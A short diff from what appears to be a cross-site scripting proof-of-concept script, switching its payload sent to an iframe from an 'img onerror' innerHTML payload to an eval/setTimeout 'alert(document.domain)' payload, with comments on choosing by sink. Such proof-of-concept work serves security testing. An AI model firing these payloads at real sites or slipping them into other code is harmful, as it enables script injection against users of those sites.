@@ -11,10 +11,10 @@
             // CHOOSE YOUR PAYLOAD BASED ON THE SINK:
             
             // If the target puts your message into innerHTML:
-            var payload = "<img src=x onerror=alert(document.domain)>";
+            //var payload = "<img src=x onerror=alert(document.domain)>";
             
             // OR if the target puts your message into eval() or setTimeout():
-            // var payload = "alert(document.domain)";
+             var payload = "alert(document.domain)";
             
             console.log("Sending payload to iframe: " + payload);
             
